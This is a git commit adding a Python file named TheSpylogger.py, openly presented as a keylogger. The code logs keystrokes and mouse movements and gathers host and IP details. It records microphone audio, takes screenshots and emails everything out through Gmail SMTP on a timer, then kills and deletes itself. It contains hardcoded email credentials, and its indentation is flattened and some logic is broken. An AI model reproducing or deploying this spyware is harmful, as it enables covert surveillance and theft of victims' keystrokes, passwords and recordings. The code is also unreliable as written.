75f880f68fe65b486f35d78e5632ff8bf2aeb44f
Sanjok Karki <55534535+sanjokkarki@users.noreply.github.com>
2021-01-21 19:50:25 +0530

    Add files via upload

---
+++ TheSpylogger.py
@@ -0,0 +1,141 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+"""
+88888888888888              .d8888b.                   d8b        888      
+    888    888             d88P  Y88b                  Y8P        888      
+    888    888             Y88b.                                  888      
+    888    88888b.  .d88b.  "Y888b.   8888b. 88888b.  8888 .d88b. 888  888 
+    888    888 "88bd8P  Y8b    "Y88b.    "88b888 "88b "888d88""88b888 .88P 
+    888    888  88888888888      "888.d888888888  888  888888  888888888K  
+    888    888  888Y8b.    Y88b  d88P888  888888  888  888Y88..88P888 "88b 
+    888    888  888 "Y8888  "Y8888P" "Y888888888  888  888 "Y88P" 888  888 
+                                                       888                 
+                                                      d88P                 
+                                                    888P"                  
+"""
+
+import logging
+import os
+import platform
+import smtplib
+import socket
+import threading
+import wave
+import pyscreenshot
+import sounddevice as sd
+from pynput import keyboard
+from pynput.keyboard import Listener
+
+
+class KeyLogger:
+def __init__(self, time_interval, email, password):
+self.interval = time_interval
+self.log = "KeyLogger Started..."
+self.email = email
+self.password = password
+
+def appendlog(self, string):
+self.log = self.log + string
+
+def on_move(self, x, y):
+current_move = logging.info("Mouse moved to {} {}".format(x, y))
+self.appendlog(current_move)
+
+def on_click(self, x, y):
+current_click = logging.info("Mouse moved to {} {}".format(x, y))
+self.appendlog(current_click)
+
+def on_scroll(self, x, y):
+current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
+self.appendlog(current_scroll)
+
+def save_data(self, key):
+try:
+current_key = str(key.char)
+except AttributeError:
+if key == key.space:
+current_key = "SPACE"
+elif key == key.esc:
+current_key = "ESC"
+else:
+current_key = " " + str(key) + " "
+
+self.appendlog(current_key)
+
+def send_mail(self, email, password, message):
+server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
+server.starttls()
+server.login(email, password)
+server.sendmail(email, email, message)
+server.quit()
+
+def report(self):
+self.send_mail(self.email, self.password, "\n\n" + self.log)
+self.log = ""
+timer = threading.Timer(self.interval, self.report)
+timer.start()
+
+def system_information(self):
+hostname = socket.gethostname()
+ip = socket.gethostbyname(hostname)
+plat = platform.processor()
+system = platform.system()
+machine = platform.machine()
+self.appendlog(hostname)
+self.appendlog(ip)
+self.appendlog(plat)
+self.appendlog(system)
+self.appendlog(machine)
+
+def microphone(self):
+fs = 44100
+seconds = 10
+obj = wave.open('sound.wav', 'w')
+obj.setnchannels(1) # mono
+obj.setsampwidth(2)
+obj.setframerate(fs)
+myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
+obj.writeframesraw(myrecording)
+sd.wait()
+
+self.send_mail(email="MAIL", password="PASSWORD", message=obj)
+
+def screenshot(self):
+img = pyscreenshot.grab()
+self.send_mail(email="MAIL", password="PASSWORD", message=img)
+
+def run(self):
+keyboard_listener = keyboard.Listener(on_press=self.save_data)
+with keyboard_listener:
+self.report()
+keyboard_listener.join()
+with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
+mouse_listener.join()
+if os.name == "nt":
+try:
+pwd = os.path.abspath(os.getcwd())
+os.system("cd " + pwd)
+os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+print('File was closed.')
+os.system("DEL " + os.path.basename(__file__))
+except OSError:
+print('File is close.')
+
+else:
+try:
+pwd = os.path.abspath(os.getcwd())
+os.system("cd " + pwd)
+os.system('pkill leafpad')
+os.system("chattr -i " + os.path.basename(__file__))
+print('File was closed.')
+os.system("rm -rf" + os.path.basename(__file__))
+except OSError:
+print('File is close.')
+
+
+email_address = "koreanvpn08@gmail.com"
+password = "iamsanjok"
+
+keylogger = KeyLogger(10, email_address, password)
+keylogger.run()
